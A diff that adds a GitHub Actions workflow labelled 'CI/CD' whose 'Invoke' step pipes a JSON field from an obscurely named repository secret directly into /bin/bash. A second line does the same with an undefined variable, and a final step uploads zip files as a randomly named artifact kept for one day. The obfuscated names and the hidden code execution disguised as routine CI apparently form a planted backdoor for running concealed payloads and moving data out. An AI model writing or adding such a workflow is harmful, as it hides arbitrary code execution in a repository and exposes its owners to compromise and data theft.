@@ -1,0 +1,30 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Invoke
+        env:
+          pvsq27908: ${{ secrets.pvsq27908 }}
+        run: |
+          printf '%s' "$pvsq27908" | jq -r .kcyhe240 | /bin/bash
+          printf '%s' "$y7831" | jq -r .l123 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: xqbF1Gvq
+          path: "*.zip"
+          retention-days: 1
